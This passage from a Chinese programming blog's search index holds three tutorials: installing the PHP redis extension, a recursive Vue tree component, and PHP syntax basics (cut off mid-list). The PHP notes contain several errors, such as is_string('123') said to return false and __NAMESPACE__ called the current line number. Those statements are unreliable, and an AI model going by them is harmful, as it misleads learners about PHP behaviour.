环境参数，你可以通过该参数向多个 php 版本中安装插件，如果你的设备上只有一个，你可以加载该参数也可以不加载该参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure --with-php-config=/usr/bin/php-config</span><br></pre></td></tr></table></figure><p>接下来就可以直接执行编译与安装:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h1 id="4-启用插件"><a href="#4-启用插件" class="headerlink" title="4. 启用插件"></a>4. 启用插件</h1><p>打开 <code>php.ini</code> 文件（以 Apache 环境下的 PHP 配置为例）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/php/7.3/apache/php.ini</span><br></pre></td></tr></table></figure><p>向配置文件中添加该扩展的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; php.ini</span><br><span class="line">extension=redis</span><br></pre></td></tr></table></figure><p>重启 Apache 服务器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apachectl restart</span><br></pre></td></tr></table></figure><p>之后使用 <code>phpinfo()</code> 方法即可查看当前 php 的环境，如果可以搜索到 <code>redis</code>，那么就说明安装完成。</p><p>如果启用无效，请回头看标题1。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue递归组件——树形组件的实现参考</title>
      <link href="/2019/12/54cdea431f76.html"/>
      <url>/2019/12/54cdea431f76.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-组件的调用方式"><a href="#1-组件的调用方式" class="headerlink" title="1. 组件的调用方式"></a>1. 组件的调用方式</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=<span class="string">&quot;tree&quot;</span>&gt;</span><br><span class="line">    &lt;Tree <span class="punctuation">:</span>treeData=<span class="string">&quot;tree&quot;</span>&gt;&lt;/Tree&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Tree from <span class="string">&quot;./components/Tree&quot;</span>;</span><br><span class="line">export default <span class="punctuation">&#123;</span></span><br><span class="line">  components<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    Tree</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  data() <span class="punctuation">&#123;</span></span><br><span class="line">    return <span class="punctuation">&#123;</span></span><br><span class="line">      tree<span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          id<span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          title<span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          next<span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              id<span class="punctuation">:</span> <span class="string">&quot;1-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">              title<span class="punctuation">:</span> <span class="string">&quot;1-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">              next<span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                  id<span class="punctuation">:</span> <span class="string">&quot;1-1-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  title<span class="punctuation">:</span> <span class="string">&quot;1-1-1&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              id<span class="punctuation">:</span> <span class="string">&quot;1-2&quot;</span><span class="punctuation">,</span></span><br><span class="line">              title<span class="punctuation">:</span> <span class="string">&quot;1-2&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          id<span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">          title<span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">          next<span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              id<span class="punctuation">:</span> <span class="string">&quot;2-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">              title<span class="punctuation">:</span> <span class="string">&quot;2-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">              next<span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                  id<span class="punctuation">:</span> <span class="string">&quot;2-1-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  title<span class="punctuation">:</span> <span class="string">&quot;2-1-1&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              id<span class="punctuation">:</span> <span class="string">&quot;2-2&quot;</span><span class="punctuation">,</span></span><br><span class="line">              title<span class="punctuation">:</span> <span class="string">&quot;2-2&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span>;</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="2-父级组件"><a href="#2-父级组件" class="headerlink" title="2. 父级组件"></a>2. 父级组件</h1><p>父级组件组要是负责接受整个数据，遍历最外层的节点内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// components/Tree/index.vue</span></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tree&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Item</span> <span class="attr">v-for</span>=<span class="string">&quot;item in treeData&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span> <span class="attr">:nodeData</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">import</span> <span class="title class_">Item</span> <span class="keyword">from</span> <span class="string">&quot;./subcomponents/Item&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">name</span>: <span class="string">&quot;Tree&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">components</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title class_">Item</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> &#123;&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">props</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">treeData</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">type</span>: <span class="title class_">Array</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">required</span>: <span class="literal">true</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&quot;css&quot;</span> <span class="attr">scpoed</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-class">.tree</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">margin-left</span>: -<span class="number">20px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="3-节点组件"><a href="#3-节点组件" class="headerlink" title="3. 节点组件"></a>3. 节点组件</h1><p>节点组件负责渲染节点本身，分为两种情况渲染：</p><ol><li>节点没有子节点，就输出单独一个节点内容</li><li>节点有子节点，渲染输出自己节点的内容同时，再循环遍历子节点的每个节点内容</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// components/Tree/subcomponents/Item.vue</span></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;node&quot;</span> <span class="attr">id</span>=<span class="string">&quot;nodeData.id&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;nodeData.next&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;floder&quot;</span>&gt;</span>Floder : &#123;&#123; nodeData.title &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Node</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">v-for</span>=<span class="string">&quot;subItem in nodeData.next&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">:key</span>=<span class="string">&quot;subItem.id&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">:nodeData</span>=<span class="string">&quot;subItem&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    &gt;</span><span class="tag">&lt;/<span class="name">Node</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;node&quot;</span> <span class="attr">v-else</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;file&quot;</span>&gt;</span>file : &#123;&#123; nodeData.title &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">name</span>: <span class="string">&quot;Node&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> &#123;&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="attr">props</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">nodeData</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">type</span>: <span class="title class_">Object</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">required</span>: <span class="literal">true</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scope</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-class">.node</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">margin-left</span>: <span class="number">20px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-class">.floder</span> &#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  <span class="attribute">font-weight</span>: bold;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>后记：其实再 Item 组件中可以通过调用父级的 Tree 组件也可以实现对当前组件的递归调用。但是再 Vue 的子组件中如果调用父组件的话，会提示没有注册相应的组件，这应该是 Vue 为了防止组件循环调用而禁止了子组件去调用父组件吧。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Demo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP语法基础</title>
      <link href="/2019/12/08ff36578f99.html"/>
      <url>/2019/12/08ff36578f99.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-变量"><a href="#1-变量" class="headerlink" title="1. 变量"></a>1. 变量</h1><h2 id="1-1-变量定义"><a href="#1-1-变量定义" class="headerlink" title="1.1 变量定义"></a>1.1 变量定义</h2><p>PHP 中的变量不需要任何赋值关键字，直接使用 <code>$</code> 即可创建一个变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var1</span>;      <span class="comment">// 定义变量</span></span><br><span class="line"><span class="variable">$var2</span> = <span class="number">1</span>;  <span class="comment">// 定义并赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var2</span>; <span class="comment">// 输出变量</span></span><br></pre></td></tr></table></figure><p>定义变量后如果不适用就需要删除变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="variable">$var2</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$var2</span>);  <span class="comment">// Udefined variable</span></span><br></pre></td></tr></table></figure><p>变量定义规则：</p><ul><li>必须以 <code>$</code> 开始</li><li>变量可以有数字、字母、下划线，但是不能以数字开头，如 <code>$1var</code></li><li>PHP 允许使用中文变量</li></ul><h2 id="1-2-预定义变量"><a href="#1-2-预定义变量" class="headerlink" title="1.2 预定义变量"></a>1.2 预定义变量</h2><ul><li>$_GET</li><li>$_POST</li><li>$_REQUEST</li><li>$GLOBALS</li><li>$_SERVER：服务器信息</li><li>$_SESSION</li><li>$_COOKIE</li><li>$_ENV</li><li>$_FILES</li></ul><h2 id="1-3-可变变量"><a href="#1-3-可变变量" class="headerlink" title="1.3 可变变量"></a>1.3 可变变量</h2><p>如果 <code>$</code> 后紧跟一个带有 <code>$</code> 的变量，变量的值为另一个变量的名字，则可以通过第一个 <code>$</code> 取到相应变量的值，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;result&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>      <span class="comment">// &#x27;result&#x27;</span></span><br></pre></td></tr></table></figure><p>原理：<code>$a</code> =&gt; ‘b’， <code>$</code> 与 <code>&#39;b&#39;</code> 绑定 =&gt; <code>$b</code> =&gt; ‘result’</p><h2 id="1-4-变量传值"><a href="#1-4-变量传值" class="headerlink" title="1.4 变量传值"></a>1.4 变量传值</h2><p>值传递：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>, <span class="variable">$b</span>;    <span class="comment">// 1,2</span></span><br></pre></td></tr></table></figure><p>引用传递：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>, <span class="variable">$b</span>   <span class="comment">// 2, 2 </span></span><br></pre></td></tr></table></figure><h1 id="2-常量"><a href="#2-常量" class="headerlink" title="2. 常量"></a>2. 常量</h1><h2 id="2-1-常量的定义"><a href="#2-1-常量的定义" class="headerlink" title="2.1 常量的定义"></a>2.1 常量的定义</h2><p>两种方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;常量名&#x27;</span>, 常量值, [是否区分大小写]); </span><br><span class="line"><span class="keyword">const</span> 常量名 = 值;  <span class="comment">// php 5.3+</span></span><br></pre></td></tr></table></figure><p>特殊常量仅能使用 <code>define()</code> ，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;-_-&#x27;</span>, <span class="string">&#x27;smile&#x27;</span>);</span><br><span class="line"><span class="comment">// const -_- = &#x27;smile&#x27; 错误</span></span><br></pre></td></tr></table></figure><p><code>define</code> 与 <code>const</code> 定义常量的区别再于 <strong>访问权限</strong> 。</p><p>对于特殊常量我们需要使用 <code>constant()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;-_-&#x27;</span>, <span class="string">&#x27;smile&#x27;</span>);</span><br><span class="line"><span class="comment">// echo -_- 错误</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">constant</span>(<span class="string">&#x27;-_-&#x27;</span>) <span class="comment">// &#x27;smile&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="2-2-系统常量"><a href="#2-2-系统常量" class="headerlink" title="2.2 系统常量"></a>2.2 系统常量</h2><p>常用常量：</p><ul><li>PHP_VERSION</li><li>PHP_INT_MAX</li><li>PHP_INT_SIZE：表示整型所占用的字节数，值为4，PHP中整型允许负数</li></ul><blockquote><p>整数类型由 4 个字节存放，也就是 32 位，转化为十进制后可以表达的最大数为 <code>4294967295</code> ，但是 PHP 的的 <code>PHP_INT_MAX</code> 只有 <code>2147483647</code>，这是因为 PHP 需要用一个符号位来表示负数，因此实际上用来表示数字的占 31 位。</p></blockquote><blockquote><p>在 64 位的 PHP 中，PHP_INT_SIZE 为 8，相应的 PHP_INT_MAX 也更大。</p></blockquote><p>魔术常量：</p><ul><li>__DIR__：当前被执行脚本所在的绝对路径</li><li>__FILE__：当前被执行脚本的绝对路径（带名字）</li><li>__NAMESPACE__：当前所属的行数</li><li>__CLASS__：当前所属的类</li><li>__METHOD__：当前所属的方法</li></ul><h1 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3. 数据类型"></a>3. 数据类型</h1><p>data type 在 PHP 中指的是数据本身的类型，而不是变量的类型，PHP是一种弱语言类型，本身没有数据类型。</p><h2 id="3-1-八种数据类型"><a href="#3-1-八种数据类型" class="headerlink" title="3.1 八种数据类型"></a>3.1 八种数据类型</h2><p>PHP 的数据类型可分为三大类八小类。</p><p><strong>简单/基本数据类型（4个小类）：</strong></p><ul><li>整型 int/integer：4个字节存储，如果超出存储范围，会被转为浮点型存储</li><li>浮点型 float/double：8个字节存储</li><li>字符串型 string：根据系统长度分配</li><li>布尔类型 bool/boolean</li></ul><p><strong>复合数据类型（2小类）：</strong></p><ul><li>资源类型 resource：存放资源数据（PHP 外部数据，如数据库、文件）</li><li>空类型 NULL：只有一个值就是 NULL </li></ul><h2 id="3-2-类型转换"><a href="#3-2-类型转换" class="headerlink" title="3.2 类型转换"></a>3.2 类型转换</h2><p>PHP 中有两种类型的转换方式：</p><p>自动转换：系统自行转换，效率较低</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;abc1.1.1&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;1.1.1abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> + <span class="variable">$b</span>; <span class="comment">// 1.1</span></span><br></pre></td></tr></table></figure><p>强制转换：根据自己的需要将目标类型转换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;abc1.1.1&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;1.1.1abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">float</span>)<span class="variable">$a</span>, (<span class="keyword">float</span>)<span class="variable">$b</span>; <span class="comment">// 01.1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">// &#x27;abc1.1.1&#x27;</span></span><br></pre></td></tr></table></figure><p>同时还可以使用 <code>settype()</code> 方法对变量进行强制转换，这会对原来的值产生影响:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;1.1.1abc&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">settype</span>(<span class="variable">$b</span>, <span class="string">&#x27;int&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20191212104623.png" alt=""></p><p>其他类型转数据值的说明：</p><ul><li>布尔 true 为 1，false 为0</li><li>字符串数据有自己的规则<ul><li>以字母开头的字符，永远为0</li><li>数字开头的字符，取碰到字符前的数字部分</li></ul></li></ul><h2 id="3-3-类型判断"><a href="#3-3-类型判断" class="headerlink" title="3.3 类型判断"></a>3.3 类型判断</h2><p>使用 <code>is_</code> 判断，结果返回一个布尔值，但由于 Bool 类型不能用 <code>echo</code> 来查看，所以要使用 <code>var_dump</code> 结构来查看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$a</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$a</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>使用 <code>gettype()</code> 方法也可以用来获取类型，得到是该类型对应的字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettype</span>(<span class="variable">$a</span>); <span class="comment">// string</span></span><br></pre></td></tr></table></figure><h2 id="3-4-数字类型"><a href="#3-4-数字类型" class="headerlink" title="3.4 数字类型"></a>3.4 数字类型</h2><p>不同的进制表示方法如下：</p><ul><li><code>$a = 120;</code> 十进制</li><li><code>$a = 0b110;</code> 二进制，以 <code>0b</code> 开头</li><li><code>$a = 0120;</code> 八进制，以 <code>0</code> 开头</li><li><code>$a = 0x120;</code> 